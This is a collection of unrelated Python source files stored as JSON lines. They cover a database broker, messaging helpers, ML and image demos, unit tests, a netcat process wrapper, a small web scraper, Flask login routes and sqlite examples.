{"text": "\"\"\"API for accessing the metadata and file storage\"\"\"\nfrom regolith.database import dump_database, open_dbs\nfrom regolith.runcontrol import DEFAULT_RC, load_rcfile, filter_databases\nfrom regolith.storage import store_client, push\n\n\ndef load_db(rc_file=\"regolithrc.json\"):\n    \"\"\"Create a Broker instance from an rc file\"\"\"\n    rc = DEFAULT_RC\n    rc._update(load_rcfile(rc_file))\n    filter_databases(rc)\n    return Broker(rc)\n\n\nclass Broker:\n    \"\"\"Interface to the database and file storage systems\n\n    Examples\n    --------\n\n    >>> # Load the db\n    >>> db = Broker.from_rc()\n    >>> # Get a docment from the broker\n    >>> ergs =db['group']['ergs']\n    >>> # Store a file\n    >>> db.add_file(ergs, 'myfile', '/path/to/file/hello.txt')\n    >>> # Get a file from the store\n    >>> path = db.get_file_path(ergs, 'myfile')\n    \"\"\"\n\n    def __init__(self, rc=DEFAULT_RC):\n        self.rc = rc\n        # TODO: Lazy load these\n        with store_client(rc) as sclient:\n            self.store = sclient\n        rc.client = open_dbs(rc)\n        self._dbs = rc.client.dbs\n        self.md = rc.client.chained_db\n        self.db_client = rc.client\n\n    def add_file(self, document, name, filepath):\n        \"\"\"Add a file to a document in a collection.\n\n        Parameters\n        ----------\n        document : dict\n            The document to add the file to\n        name : str\n            Name of the reference to the file\n        filepath : str\n            Location of the file on local disk\n        \"\"\"\n        output_path = self.store.copydoc(filepath)\n        if \"files\" not in document:\n            document[\"files\"] = {}\n        document[\"files\"][name] = output_path\n        for db in self.rc.databases:\n            dump_database(db, self.db_client, self.rc)\n        push(self.store.store, self.store.path)\n\n    @classmethod\n    def from_rc(cls, rc_file=\"regolithrc.json\"):\n        \"\"\"Return a Broker instance\"\"\"\n        return load_db(rc_file)\n\n    def get_file_path(self, document, name):\n        \"\"\" Get a file from the file storage associated with the document and\n        name\n\n        Parameters\n        ----------\n        document : dict\n            The document which stores the reference to the file\n        name : str\n            The name of the file stored (note that this can be different from\n            the filename itself)\n\n        Returns\n        -------\n        path : str or None\n            The file path, if not in the storage None\n        \"\"\"\n        if \"files\" in document:\n            return self.store.retrieve(document[\"files\"][name])\n        else:\n            return None\n\n    def __getitem__(self, item):\n        return self.md[item]\n"}
{"text": "#    Copyright 2016 Mirantis, Inc.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\nimport re\n\nfrom oslo_messaging._drivers import common as rpc_common\nfrom oslo_messaging._i18n import _\n\n\n# current driver's version for representing internal message format\nMESSAGE_VERSION = '1.0'\n\n\nclass UnsupportedMessageVersionError(rpc_common.RPCException):\n    msg_fmt = _(\"Message version %(version)s is not supported.\")\n\n    def __init__(self, version):\n        super(UnsupportedMessageVersionError, self).__init__(version=version)\n\n\ndef get_method_versions(obj, method_name):\n    \"\"\"Useful function for initializing versioned senders/receivers.\n\n    Returns a dictionary of different internal versions of the given method.\n\n    Assumes that the object has the particular versioned method and this method\n    is public. Thus versions are private implementations of the method.\n\n    For example, for a method 'func' methods '_func_v_1_0', '_func_v_1_5',\n    '_func_v_2_0', etc. are assumed as its respective 1.0, 1.5, 2.0 versions.\n    \"\"\"\n\n    assert callable(getattr(obj, method_name, None)), \\\n        \"Object must have specified method!\"\n    assert not method_name.startswith('_'), \"Method must be public!\"\n\n    method_versions = {}\n    for attr_name in dir(obj):\n        if attr_name == method_name:\n            continue\n        attr = getattr(obj, attr_name, None)\n        if not callable(attr):\n            continue\n        match_obj = re.match(r'^_%s_v_(\\d)_(\\d)$' % method_name, attr_name)\n        if match_obj is not None:\n            version = '.'.join([match_obj.group(1), match_obj.group(2)])\n            method_versions[version] = attr\n\n    return method_versions\n"}
{"text": "L = ['Micheal', 'Hanson', 'William', 'Lucy', 'Frank'] \n# if you want to get the first three values in a list\n# 1> The simplest way\ndef getFirstThreeValueOfList1(L):\n\tsubL1 = [L[0], L[1], L[2]]\n\treturn subL1\n\n# 2> Use a loop\ndef getSubList(L = None,  n = 3):\n\tif (not isinstance(L, (list)) and not isinstance(n, (int, float))):\n\t\t raise TypeError('bad operand type')\n\tsubL2 = []\n\tfor i in range(n):\n\t\tsubL2.append[L[i]] \n\treturn subL2\n\n# 3> Use Slice feature\ndef getSubListBySlice(L, first = 0, last = -1):\n\tif (not isinstance(L, (list)) and not isinstance((first, last), (int, float))):\n\t\traise TypeError('bad operand type')\n\tif last > 0 and last > first:\n\t\treturn L[first:last]\n\telif last < 0 and last + len(L) > first:\n\t\treturn L[first:last]\n\telse: \n\t\traise TypeError('Argument value error')\n\n# \n\n# Test\nprint L\nprint getSubListBySlice(L, 0, 2)\nprint getSubListBySlice(L, 3)\nprint getSubListBySlice(L, -3)\nprint getSubListBySlice(L, 20, 30)\n\n\n####If there is a list and you want to get a value every 3 values behind\ndef getValuePerXValue(L, n):\n\treturn L[::n]\n\n# Test\nNumList = range(100)\nprint getValuePerXValue(NumList, 22)\n\n\n####  Iterator  ####\nfrom collections import Iterable\nprint isinstance('ABC', Iterable)\nprint isinstance([], Iterable)\nprint isinstance(123, Iterable)\n"}
{"text": "#coding = utf-8\nfrom mpl_toolkits.mplot3d import Axes3D\nfrom autoencoder import AutoEncoder, DataIterator\nimport codecs\nfrom random import shuffle\nfrom matplotlib import pyplot as plt\nimport numpy as np\n\nclass IrisDataSet(object):\n\n    def get_label_id(self, label):\n        if label in self.label_id_dict:\n            return self.label_id_dict[label]\n        self.label_id_dict[label] = self.next_label_id\n        self.next_label_id += 1\n        return self.next_label_id - 1\n\n    def __init__(self):\n        self.next_label_id = 0\n        self.label_id_dict = {}\n        with codecs.open(\"tutorial_datasets/iris/iris.data\", \"r\", \"utf-8\") as f:\n            str_datas = [line.strip() for line in f]\n        str_datas = [line.split(\",\") for line in str_datas if len(line) > 0]\n        shuffle(str_datas)\n        self.datas = [[float(d) for d in row_data[0:-1]] for row_data in str_datas]\n        # normalize datas\n        self.datas = np.array(self.datas, dtype = np.float32)\n        self.datas = self.datas/self.datas.max(0)\n        self.datas = self.datas * 2 - 1\n\n        self.labels = [self.get_label_id(row_data[-1]) for row_data in str_datas]\n\niris_dataset = IrisDataSet()\n# train data\ndatas = iris_dataset.datas\nlabels = iris_dataset.labels\n\n# data wrapper\niterator = DataIterator(datas)\nfine_tuning_iterator = DataIterator(datas, labels = labels)\n\n# train autoencoder\n# assume the input dimension is input_d\n# the network is like input_d -> 4 -> 2 -> 4 -> input_d\nautoencoder = AutoEncoder()\n\n# train autoencoder without fine-tuning\nprint \"\\ntrain autoencoder without fine-tuning ==========\\n\"\nautoencoder.fit([4, 2], iterator, stacked = True, learning_rate = 0.02, max_epoch = 5000, tied = True, activation = \"tanh\")\n\n# encode data (without fine-tuning)\nencoded_datas = autoencoder.encode(datas)\nprint \"encoder (without fine-tuning) ================\"\nprint encoded_datas\n\n# train autoencoder with fine-tuning\nprint \"\\ntrain autoencoder with fine-tuning ==========\\n\"\nautoencoder.fine_tune(fine_tuning_iterator, supervised = True, learning_rate = 0.02, max_epoch = 10000, tied = True)\n#autoencoder.fine_tune(fine_tuning_iterator, supervised = False, learning_rate = 0.02, max_epoch = 6000)\n\n# encode data (with fine-tuning)\ntuned_encoded_datas = autoencoder.encode(datas)\nprint \"encoder (with fine-tuning)================\"\nprint tuned_encoded_datas\n\n# predict data( based on fine tuning )\npredicted_datas = autoencoder.predict(datas)\nprint \"predicted ================\"\nprint predicted_datas\npredicted_labels = predicted_datas.argmax(1)\neval_array = (predicted_labels == labels)\ncorrect_count = len(np.where(eval_array == True)[0])\nerror_count = len(np.where(eval_array == False)[0])\ncorrect_rate = float(correct_count)/(correct_count + error_count)\nerror_rate = float(error_count)/(correct_count + error_count)\nprint \"correct: {}({})\\terror: {}({})\".format(correct_count, \"%.2f\" % correct_rate, error_count, \"%.2f\" % error_rate)\nautoencoder.close()\n\n#visualize encoded datas\ncolors = [\"red\", \"green\", \"blue\"]\nlabel_colors = [colors[label_id] for label_id in labels]\n\nfig_3d =plt.figure(\"origin iris data\")\nplot_3d = fig_3d.add_subplot(111, projection='3d')\nplot_3d.scatter(datas[:,0], datas[:,1], datas[:, 2], color = label_colors)\n\nfig_2d = plt.figure(\"encoded iris data (without fine-tuning)\")\nplot_2d = fig_2d.add_subplot(111)\nplot_2d.scatter(encoded_datas[:,0], encoded_datas[:,1], color = label_colors)\n\nfig_tuned_2d = plt.figure(\"encoded iris data (with fine-tuning)\")\nplot_tuned_2d = fig_tuned_2d.add_subplot(111)\nplot_tuned_2d.scatter(tuned_encoded_datas[:,0], tuned_encoded_datas[:,1], color = label_colors)\n\nplt.show()\n"}
{"text": "#!/usr/bin/python2.7\n# -*- coding: utf-8 -*-\n# vim:ts=4:sw=4:softtabstop=4:smarttab:expandtab\n\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n\n#    http://www.apache.org/licenses/LICENSE-2.0\n\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n\"\"\"\nWrapper for the netcat program. Allows TCP port forwarding to stdio. If your\nnetcat (nc) is suid to root, you can forward privileged ports, such as SMTP.\n\n\"\"\"\n\nimport sys\nfrom pycopia import proctools\n\ntry:\n    NETCAT = proctools.which(\"nc\")\nexcept proctools.NotFoundError:\n    NETCAT = proctools.which(\"netcat\")\n\nTESTED_VERSIONS = [\"[v1.10]\"]\n\n\ndef get_netcat(host, port, callback=None, logfile=None, extraoptions=\"\"):\n    \"\"\"get_netcat(host, port, [prompt], [callback], [logfile], [extraoptions])\nReturns a Netcat object (an Expect subclass) attached to a netcat client.\n\nThe logfile parameter should be a file-like object (has a 'write' method).\n\"\"\"\n    cmd = \"%s %s %s %s\" %(NETCAT, extraoptions, host, port)\n    pm = proctools.get_procmanager()\n    proc = pm.spawnpipe(cmd, callback=callback, logfile=logfile, merge=0)\n    return proc\n\ndef netcat_server(port, callback=None, logfile=None, extraoptions=\"\"):\n    extraoptions += \" -l -p %d\" % (port)\n    cmd = \"%s %s\" %(NETCAT, extraoptions)\n    pm = proctools.get_procmanager()\n    proc = pm.spawnpipe(cmd, callback=callback, logfile=logfile, merge=0)\n    return proc\n\nnetcat_listener = netcat_server # alias\n\ndef killall():\n    pm = proctools.get_procmanager()\n    for proc in pm.getbyname(NETCAT):\n        proc.kill()\n\n\ndef netcat_version():\n    \"\"\"netcat_version() Return the version string for the netcat command on this system.\"\"\"\n    nc = proctools.spawnpipe(\"%s -h\" % (NETCAT))\n    ver = nc.readline()\n    nc.read() # discard rest\n    nc.wait()\n    return ver.strip()\n\ndef check_version():\n    \"\"\"Checks that the installed netcat program is the same as this module was\n    tested with (and written for).\"\"\"\n    ver = netcat_version()\n    for vs in TESTED_VERSIONS:\n        if ver == vs:\n            return 1\n    return 0\n\n"}
{"text": "import unittest\n\nfrom troposphere import Template, efs\n\n\nclass TestEfsTemplate(unittest.TestCase):\n    def test_bucket_template(self):\n        template = Template()\n        title = \"Efs\"\n        efs.FileSystem(title, template)\n        self.assertIn(title, template.resources)\n\n\nclass TestEfs(unittest.TestCase):\n    def test_validData(self):\n        file_system = efs.FileSystem(\"Efs\")\n        file_system.to_dict()\n\n    def test_validateThroughputMode(self):\n        with self.assertRaises(ValueError):\n            file_system = efs.FileSystem(\n                \"Efs\", ThroughputMode=\"UndefinedThroughputMode\"\n            )\n            file_system.to_dict()\n\n        file_system = efs.FileSystem(\"Efs\", ThroughputMode=efs.Bursting)\n\n        result = file_system.to_dict()\n        self.assertEqual(result[\"Type\"], \"AWS::EFS::FileSystem\")\n\n    def test_validateProvisionedThroughputInMibps(self):\n        with self.assertRaises(TypeError):\n            file_system = efs.FileSystem(\"Efs\", ProvisionedThroughputInMibps=\"512\")\n            file_system.to_dict()\n\n        with self.assertRaises(TypeError):\n            file_system = efs.FileSystem(\"Efs\", ProvisionedThroughputInMibps=512)\n            file_system.to_dict()\n\n        file_system = efs.FileSystem(\"Efs\", ProvisionedThroughputInMibps=512.0)\n\n        result = file_system.to_dict()\n        self.assertEqual(result[\"Type\"], \"AWS::EFS::FileSystem\")\n\n    def test_validateBackupPolicy(self):\n        with self.assertRaises(ValueError):\n            backup_policy = efs.BackupPolicy(\"backupPolicy\", Status=\"NOTOK\")\n            backup_policy.to_dict()\n\n        backup_policy = efs.BackupPolicy(\"backupPolicy\", Status=\"ENABLED\")\n\n        result = backup_policy.to_dict()\n        self.assertEqual(result[\"Status\"], \"ENABLED\")\n\n\nif __name__ == \"__main__\":\n    unittest.main()\n"}
{"text": "#!/usr/bin/env python\n# Safe Eyes is a utility to remind you to take break frequently\n# to protect your eyes from eye strain.\n\n# Copyright (C) 2019  Gobinath\n\n# This program is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n\n# You should have received a copy of the GNU General Public License\n# along with this program.  If not, see <http://www.gnu.org/licenses/>.\n\"\"\"\nMedia Control plugin lets users to pause currently playing media player from the break screen.\n\"\"\"\n\nimport logging\nimport os\nimport dbus\nimport re\nimport gi\nfrom safeeyes.model import TrayAction\ngi.require_version('Gtk', '3.0')\nfrom gi.repository import Gtk\n\ntray_icon_path = None\n\n\ndef __active_players():\n    \"\"\"\n    List of all media players which are playing now.\n    \"\"\"\n    players = []\n    bus = dbus.SessionBus()\n\n    for service in bus.list_names():\n        if re.match('org.mpris.MediaPlayer2.', service):\n            player = bus.get_object(service, \"/org/mpris/MediaPlayer2\")\n            interface = dbus.Interface(player, 'org.freedesktop.DBus.Properties')\n            status = str(interface.Get('org.mpris.MediaPlayer2.Player', 'PlaybackStatus')).lower()\n            if status == \"playing\":\n                players.append(player)\n    return players\n\n\ndef __pause_players(players):\n    \"\"\"\n    Pause all playing media players using dbus.\n    \"\"\"\n    for player in players:\n        interface = dbus.Interface(player, dbus_interface='org.mpris.MediaPlayer2.Player')\n        interface.Pause()\n\n\ndef init(ctx, safeeyes_config, plugin_config):\n    \"\"\"\n    Initialize the screensaver plugin.\n    \"\"\"\n    global tray_icon_path\n    tray_icon_path = os.path.join(plugin_config['path'], \"resource/pause.png\")\n\n\ndef get_tray_action(break_obj):\n    \"\"\"\n    Return TrayAction only if there is a media player currently playing.\n    \"\"\"\n    players = __active_players()\n    if players:\n        return TrayAction.build(\"Pause media\",\n                                tray_icon_path,\n                                Gtk.STOCK_MEDIA_PAUSE,\n                                lambda: __pause_players(players))\n"}
{"text": "# coding = 'utf-8'\nimport math\nimport config as cfg\nimport re\nimport jieba\nimport urllib.request\nfrom urllib import error\nfrom sklearn.feature_extraction.text import TfidfVectorizer\n\n\n# \u624b\u673a\nuser_agent = r'Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_0 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8A293'\nuser_agent2 = 'Mozilla/5.0\u00a0(iPhone;\u00a0CPU\u00a0iPhone\u00a0OS\u00a06_0\u00a0like\u00a0Mac\u00a0OS\u00a0X)\u00a0AppleWebKit/536.26\u00a0(KHTML,\u00a0like\u00a0Gecko)\u00a0Version/6.0\u00a0Mobile/10A403\u00a0Safari/8536.25'\n\n\n\n#\u00a0\u6a21\u62df\u7535\u8111\u00a0\u00a0\nuser_agent_pc = 'Mozilla/5.0\u00a0(Windows\u00a0NT\u00a06.3;\u00a0WOW64;\u00a0rv:28.0)\u00a0Gecko/20100101\u00a0Firefox/28.0'\n\n# r'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) '\n#                   r'Chrome/45.0.2454.85 Safari/537.36 115Browser/6.0.3',\n\nheaders = {\n    'User-Agent':'Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Safari/535.19',\n\n    # 'Referer': r'http://www.lagou.com/zhaopin/Python/?labelWords=label',\n    # 'Connection': 'keep-alive'\n}\n\n\n# url_to_detect = 'http://wap.ibcbo.cc'\n# req_to_detect = urllib.request.Request(url_to_detect,headers=headers)\n#\n# page_to_detect= urllib.request.urlopen(req_to_detect)\n# print(page_to_detect.info())\n# print(page_to_detect.getcode())\n# print(page_to_detect.geturl())\n# content_bytes_to_detect = page_to_detect.read()\n# print(type(content_bytes_to_detect))\n#\n# content_str_to_detect = content_bytes_to_detect.decode('gbk')\n# # , 'ignore'\n# print(type(content_str_to_detect))\n# print(content_str_to_detect)\n# with open('content_str_to_detect.html','w+') as f:\n#  f.write(content_str_to_detect)\n#  f.close()\n#\nimport requests\n#\n# Header = {\n#   'User-Agent': 'Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Safari/535.19'}\n#\n#\nwaphead = {\n#     'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',\n# 'Accept-Encoding':'gzip, deflate',\n# 'Accept-Language':'zh-CN,zh;q=0.8',\n# 'Connection':'keep-alive',\n'Cookie':'x=y62ke|dEffhGdZXb0Gd00bEhGX6E387E4539',\n# 'Host':'wap.ibcbo.cc',\n# 'Referer':'http://wap.ibcbo.cc/',\n# 'Upgrade-Insecure-Requests':1,\n'User-Agent':'Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1'\n\n           }\n# R = requests.get('http://112.121.177.250', headers=Header)\nR = requests.get('http://wap.ibcbo.cc', headers=waphead)\nprint(R)\nprint(R.status_code)\n\nif R.status_code == 200:\n    str = R.content.decode('gb2312')\n    # print(str)\n#     # F = open('1716002wap.html', 'w+')  # F\u76ee\u524d\u662funicode\u7f16\u7801\uff0c\u4e0d\u7528\u518dencoding=utf-8\n#     # F.write(str)\n#     # F.close()\nelse:\n    pass"}
{"text": "#This code modifies a language identified gold standard from a 2-tag system (Eng|Span) to a 3-tag system(Eng|Span|Other)\n\n#INPUT csv file with TOKEN, POS, LANG\n\t##Lang = Eng | Span\n\t##delimiter= ,  quotechar= \"\n#OUTPUT csv with TOKEN, POS, Lang\n\t##Lang = Eng | Span | Other\n\t##delimiter= ,  quotechar= \"\n\t##file name = input_file_name + \"-retagged\"\n\n###USER input###\n#select directory\ndirectory = \"/Users/jacqueline/Google Drive/Bullock Serigos Toribio/Bilingual Annotation/Data/\"\n#select input file (must be within the directory)\ninput_filename = \"Solorio_GoldSt_7k.csv\"\n\nimport os\nimport csv\nfrom string import punctuation\nimport codecs\n\n\n#change directory\nos.chdir(directory)\n#name for output file\noutput_filename = input_filename.replace(\".csv\", \"-retagged.csv\")\n\nwith open(input_filename, 'rU') as input, open(output_filename, 'wb') as output:\n\tcorpus_input = csv.reader(input, delimiter=',', quotechar='\"', dialect=csv.excel_tab)\n\tcorpus_output = csv.writer(output, delimiter=',', quotechar='\"')\n\tfor row in corpus_input:\n\t\tif row[0] in punctuation:\n\t\t\trow[2] = \"Other\"\n\t\tif row[0].startswith(\"est\"):\n\t\t\tfor x in row:\n\t\t\t\tprint x.decode(\"utf-8\")\n\t\tcorpus_output.writerow(row)\n\n\ndef unicode_csv_reader(unicode_csv_data, dialect=csv.excel, **kwargs):\n    # csv.py doesn't do Unicode; encode temporarily as UTF-8:\n    csv_reader = csv.reader(utf_8_encoder(unicode_csv_data),\n                            dialect=dialect, **kwargs)\n    for row in csv_reader:\n        # decode UTF-8 back to Unicode, cell by cell:\n        yield [unicode(cell, 'utf-8') for cell in row]\n\ndef utf_8_encoder(unicode_csv_data):\n    for line in unicode_csv_data:\n        yield line.encode('utf-8')\n\n\n###only successful printing of text in terminal\n#save excel file as UTF 16 txt file\n#open with: f = codecs.open(\"/Users/jacqueline/Desktop/Solorio_GoldSt_7k.txt\", encoding = \"latin_1\").readlines()\n"}
{"text": "#!/usr/bin/env python\nimport cv2\nimport numpy as np\nimport matplotlib.pyplot as plt\nimport os\nimport gdfmm\n\nmissing_mask = (cv2.imread('missing_mask.png', cv2.CV_LOAD_IMAGE_UNCHANGED) == 0)\n\nfor i in xrange(100):\n    if os.path.isfile('images/rgb%d.png' % i) and \\\n       os.path.isfile('images/dep%d.png' % i) and \\\n       os.path.isfile('images/missing%d.png' % i):\n\n          bgr = cv2.imread('images/rgb%d.png' % i, cv2.CV_LOAD_IMAGE_UNCHANGED)\n          rgb = cv2.cvtColor(bgr, cv2.cv.CV_BGR2RGB)\n          dep = cv2.imread('images/dep%d.png' % i, cv2.CV_LOAD_IMAGE_UNCHANGED)\n\n\n          if dep.dtype == np.uint8:\n              dep = np.array(dep, dtype=np.uint16) * (10000 / 256)\n          missing = dep.copy()\n          missing[missing_mask] = 0\n\n          inpainted = gdfmm.InpaintDepth2(missing,\n                                           rgb,\n                                           1,  # epsilon\n                                           1,  # homogenizing constant\n                                           blur_sigma = 2.0,\n                                           window_size = 11)\n\n          # scale the depths to some visible range\n          dep_scaled = (dep / 10000.0).reshape(dep.shape + (1,)).repeat(3, axis=2)\n          inp_scaled = (inpainted/ 10000.0).reshape(dep.shape + (1,)).repeat(3, axis=2)\n          mis_scaled = (missing  / 10000.0).reshape(dep.shape + (1,)).repeat(3, axis=2)\n          rgb_scaled = rgb / 255.0\n\n          dep_scaled = np.asarray(dep_scaled, dtype=np.float)\n          inp_scaled = np.asarray(inp_scaled, dtype=np.float)\n          rgb_scaled = np.asarray(rgb_scaled, dtype=np.float)\n          mis_scaled = np.asarray(mis_scaled, dtype=np.float)\n\n          side_by_side = np.concatenate(\n                  (np.concatenate( (rgb_scaled, dep_scaled), axis=0 ),\n                  np.concatenate( (mis_scaled, inp_scaled), axis=0 )), axis=1)\n          plt.figure(figsize=(13,13))\n          plt.imshow(side_by_side)\n          plt.show()\n\n\n\n"}
{"text": "#     Copyright 2021, Kay Hayen, mailto:kay.hayen@gmail.com\n#\n#     Python test originally created or extracted from other peoples work. The\n#     parts from me are licensed as below. It is at least Free Software where\n#     it's copied from other people. In these cases, that will normally be\n#     indicated.\n#\n#     Licensed under the Apache License, Version 2.0 (the \"License\");\n#     you may not use this file except in compliance with the License.\n#     You may obtain a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#     Unless required by applicable law or agreed to in writing, software\n#     distributed under the License is distributed on an \"AS IS\" BASIS,\n#     WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n#     See the License for the specific language governing permissions and\n#     limitations under the License.\n#\n\"\"\" TkInter standalone test, trying to make sure it loads.\n\n\"\"\"\n\nfrom __future__ import print_function\n\n# Python3 changed module name.\nif str is bytes:\n    import Tkinter as tkinter\nelse:\n    import tkinter\n\n# nuitka-skip-unless-expression: __import__(\"Tkinter\" if sys.version_info[0] < 3 else \"tkinter\")\n\ntry:\n    root = tkinter.Tk()  # this will fail in absence of TCL\nexcept tkinter.TclError as e:\n    print(\"TCLError exception happened.\")\n    assert \"connect to display\" in str(e) or \"no display\" in str(e), str(e)\nelse:\n    print(\"OK\")\n"}
{"text": "#Flask imports\nfrom flask import Blueprint, render_template, flash, redirect, url_for, abort\nfrom flask.ext.login import LoginManager, login_required, logout_user, login_user\n\n#App imports\nfrom app import app\nfrom app.mod_auth.forms import LoginForm, UserForm, EmailForm, PasswordForm\nfrom app.mod_auth.models import User\nfrom utils import ts, send_email\n\nlm = LoginManager()\nlm.init_app(app)\nlm.login_view = \"auth.user_login\"\nmod_auth = Blueprint('auth', __name__, url_prefix='/user', \n    template_folder='templates')\n\n\n@lm.user_loader\ndef user_load(id):\n    return User.get_by_id(int(id))\n\n\n@mod_auth.route('/login/', methods=['GET', 'POST'])\ndef user_login():\n    #special case if database is empty we should create an user\n    if len(User.get_all()) == 0:\n        return redirect(url_for('auth.user_create'))\n\n    form = LoginForm()\n\n    if form.validate_on_submit():\n        user = User.get_by_email(email=form.email.data)\n        if user and User.check_password(user.password, form.password.data):\n            login_user(user)\n            return redirect(url_for('index'))\n        flash('Wrong email or password')\n    return render_template(\"login.html\", form=form)\n\n\n@mod_auth.route('/logout/')\n@login_required\ndef user_logout():\n    logout_user()\n    return redirect(url_for('index'))\n\n@mod_auth.route('/create', methods=[\"GET\", \"POST\"])\ndef user_create():\n    form = UserForm()\n    if form.validate_on_submit():\n        user = User()\n        user.name = form.name.data\n        user.email = form.email.data\n        user.password = form.password.data\n        user.is_admin = form.is_admin.data\n        #TODO Fix possible duplicated keys!\n        User.save(user)\n\n        # Now we'll send the email confirmation link\n        subject = \"Confirm your email\"\n\n        token = ts.dumps(user.email, salt='email-confirm-key')\n\n        confirm_url = url_for(\n            'auth.user_confirm_email',\n            token=token,\n            _external=True)\n\n        html = render_template(\n            'activate.html',\n            confirm_url=confirm_url)\n\n        # We'll assume that send_email has been defined in myapp/util.py\n        app.logger.info('Url use to confirm: {0}'.format(confirm_url))\n        send_email(user.email, subject, html)\n\n        return redirect(url_for(\"index\"))\n\n    return render_template(\"create.html\", form=form)\n\n@mod_auth.route('/confirm/<token>')\ndef user_confirm_email(token):\n    try:\n        email = ts.loads(token, salt=\"email-confirm-key\", max_age=86400)\n    except:\n        abort(404)\n\n    user = User.get_by_email(email=email)\n    user.email_confirmed = True\n    User.save(user)\n\n    return redirect(url_for('auth.user_login'))\n\n@mod_auth.route('/reset', methods=[\"GET\", \"POST\"])\ndef user_password_reset():\n    form = EmailForm()\n    if form.validate_on_submit():\n        user = User.get_by_email(email=form.email.data)\n\n        subject = \"Password reset requested\"\n\n        # Here we use the URLSafeTimedSerializer we created in `util` at the\n        # beginning of the chapter\n        token = ts.dumps(user.email, salt='recover-key')\n\n        recover_url = url_for(\n            'auth.user_reset_password_with_token',\n            token=token,\n            _external=True)\n\n        html = render_template(\n            'recover.html',\n            recover_url=recover_url)\n\n        # Let's assume that send_email was defined in myapp/util.py\n        send_email(user.email, subject, html)\n\n        return redirect(url_for('index'))\n    return render_template('reset.html', form=form)\n\n@mod_auth.route('/reset/<token>', methods=[\"GET\", \"POST\"])\ndef user_reset_password_with_token(token):\n    try:\n        email = ts.loads(token, salt=\"recover-key\", max_age=86400)\n    except:\n        abort(404)\n\n    form = PasswordForm()\n\n    if form.validate_on_submit():\n        user = User.get_by_email(email=email)\n        user.password = form.password.data\n        User.save(user)\n        return redirect(url_for('auth.user_login'))\n\n    return render_template('reset_with_token.html', form=form, token=token)\n"}
{"text": "#!/usr/bin/env python\n# encoding: utf-8\n#\n# Copyright (c) 2010 Doug Hellmann.  All rights reserved.\n#\n\"\"\"Creating the schema in an sqlite3 database.\n\"\"\"\n#end_pymotw_header\n\nimport sqlite3\n\ndb_filename = 'todo.db'\n\ndef show_projects(conn):\n    cursor = conn.cursor()\n    cursor.execute('select name, description from project')\n    for name, desc in cursor.fetchall():\n        print '  ', name\n    return\n\nwith sqlite3.connect(db_filename) as conn1:\n\n    print 'Before changes:'\n    show_projects(conn1)\n\n    # Insert in one cursor\n    cursor1 = conn1.cursor()\n    cursor1.execute(\"\"\"\n    insert into project (name, description, deadline)\n    values ('virtualenvwrapper', 'Virtualenv Extensions', '2011-01-01')\n    \"\"\")\n\n    print '\\nAfter changes in conn1:'\n    show_projects(conn1)\n\n    # Select from another connection, without committing first\n    print '\\nBefore commit:'\n    with sqlite3.connect(db_filename) as conn2:\n        show_projects(conn2)\n\n    # Commit then select from another connection\n    conn1.commit()\n    print '\\nAfter commit:'\n    with sqlite3.connect(db_filename) as conn3:\n        show_projects(conn3)\n    \n"}
{"text": "# flake8: noqa\nimport logging\n\nfrom django.conf import settings\nfrom rest_framework import status\nfrom rest_framework.response import Response\nfrom rest_framework.views import APIView\n\nfrom ava_core.integration.integration_abstract.utils import retrieve_credential_from_database\n\nlog = logging.getLogger(__name__)\n\n\nclass GatherImportAPI(APIView):\n    MODEL_NAME = ''\n    DIRECTORY_INTERFACE = None\n    PERSON_MODEL = 'organize.PersonIdentifier'\n    GROUP_MODEL = 'organize.GroupIdentifier'\n    IMPORT_DATA = {}\n\n    def get(self, request, **kwargs):\n        log.debug(str(self.__class__) + \"::POST - Entered post \")\n\n        if settings.GATHER_USE_LOCAL:\n            credential = None\n        else:\n\n            pk = self.kwargs.get('pk')\n\n            credential = retrieve_credential_from_database(self.MODEL_NAME, pk)\n\n        log.debug(str(self.__class__) + \"::POST -  Attempting data import\")\n\n        self.IMPORT_DATA = self.DIRECTORY_INTERFACE.import_directory(credential)\n\n        # parse and store the users\n        log.debug(str(self.__class__) + \"::POST - Attempting user import\")\n        self.import_users_from_json(self.IMPORT_DATA['users'])\n\n        log.debug(str(self.__class__) + \"::POST - Attempting group import\")\n        self.import_groups_from_json(self.IMPORT_DATA['groups'])\n\n        return Response({'message': \"Import complete\"}, status=status.HTTP_200_OK)\n\n    def import_users_from_json(self, users):\n        log.debug(str(self.__class__) + \"::import_users_from_json - Entered method\")\n        pass\n\n    def import_groups_from_json(self, groups):\n        log.debug(str(self.__class__) + \"::import_groups_from_json -  Entered method\")\n        pass\n\n\n"}
